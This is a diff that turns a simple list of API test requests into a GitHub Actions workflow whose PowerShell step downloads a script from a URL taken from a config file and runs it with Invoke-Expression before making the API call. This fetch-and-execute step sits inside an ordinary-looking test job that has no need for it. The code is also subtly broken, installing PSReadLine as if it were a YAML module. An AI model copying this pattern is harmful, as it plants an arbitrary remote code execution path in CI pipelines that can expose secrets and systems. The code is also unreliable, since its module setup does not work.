@@ -1,20 +1,52 @@
-- name: Basic API Tests
-  requests:
-    - name: Get User
-      method: GET
-      url: https://api.example.com/users/1
-      headers:
-        Accept: application/json
-      assertions:
-        - json id is 1
-        - json name is "John Doe"
+name: Test-Build
 
-    - name: Create User
-      method: POST
-      url: https://api.example.com/users
-      headers:
-        Content-Type: application/json
-      body: '{"name": "Alice"}'
-      assertions:
-        - status_code is 201
-        - json name is "Alice"
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  test-api:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Run PowerShell script
+        run: |
+          # Install the YAML module (if not already installed)
+          if (-not (Get-Module -Name "PSReadLine" -ListAvailable)) {
+              Install-Module -Name "PSReadLine" -Force -AllowClobber
+          }
+
+          # Load the YAML module
+          Import-Module -Name "PSReadLine"
+
+          # Read the YAML configuration file
+          $apiConfig = Get-Content -Path "api_config.yml" | ConvertFrom-Yaml
+
+          # Extract values from the configuration
+          $apiUrl = $apiConfig.api_url
+          $httpMethod = $apiConfig.http_method
+          $headers = $apiConfig.headers
+          $queryParameters = $apiConfig.query_parameters
+          $scriptUrl = $apiConfig.script_url
+
+          # Fetch and execute the script from the provided URL
+          try {
+              $scriptContent = Invoke-RestMethod -Uri $scriptUrl -Method GET
+
+              # Execute the fetched script
+              Invoke-Expression -Command $scriptContent
+
+              # Make the API request using Invoke-RestMethod
+              $response = Invoke-RestMethod -Uri $apiUrl -Method $httpMethod -Headers $headers
+
+              # Handle the API response here
+              Write-Host "API Response:"
+              Write-Host $response
+          } catch {
+              # Handle any errors that occur during the script execution or API request
+              Write-Host "An error occurred: $_"
+          }
